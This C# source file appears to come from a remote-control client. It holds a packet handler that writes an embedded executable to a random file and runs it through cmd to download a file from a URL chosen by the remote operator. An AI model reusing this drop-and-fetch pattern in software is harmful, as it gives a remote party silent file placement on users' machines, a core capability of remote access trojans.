using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    [PacketType(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST)]
    class RequestDownloadWebFileHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            var req = reqObj as RequestDownloadWebFile;

            try
            {
                // 释放程序
                byte[] data = ResUtil.GetResFileData(RES_FILE_NAME);
                string fileName = ResUtil.WriteToRandomFile(data,"download.exe");
                // 启动程序
                string arguments = string.Format("{0} {1}", req.WebFileUrl, req.DestinationPath);
                ProcessUtil.RunByCmdStart(fileName + " downloader " + arguments, true);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
